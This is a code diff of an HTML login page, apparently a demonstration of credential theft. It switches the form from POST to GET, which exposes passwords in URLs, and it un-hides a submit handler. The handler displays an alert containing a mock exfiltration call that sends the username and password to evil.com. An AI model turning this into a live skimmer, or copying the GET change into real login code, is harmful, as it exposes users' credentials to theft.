@@ -4,7 +4,7 @@
 </head>
 <body>
   <h1>Login</h1>
-  <form method="POST" action="/login">
+  <form method="GET" action="/login">
     <label for="username">Username:</label>
     <input type="text" id="username" name="username">
     <br>
@@ -17,10 +17,15 @@
   document.querySelector('form').addEventListener('submit', (event) => {
     event.preventDefault();
     const username = document.querySelector('input[name="username"]').value;
-    const password = document.querySelector('input[name="password"]').value;                alert(`Stealing username and password with code:                                    HTTPGET('https://evil.com/login?username=${username}&password=${password}')                 `);
-                                                                                        
+    const password = document.querySelector('input[name="password"]').value;
+    alert(`Stealing username and password with code:
+HTTPGET('https://evil.com/login?username=${username}&password=${password}')
+    `);
+
+
     // Send original form
     document.querySelector('form').submit();
-  })                                                                                      </script>
+  })
+  </script>
 </body>
 </html>
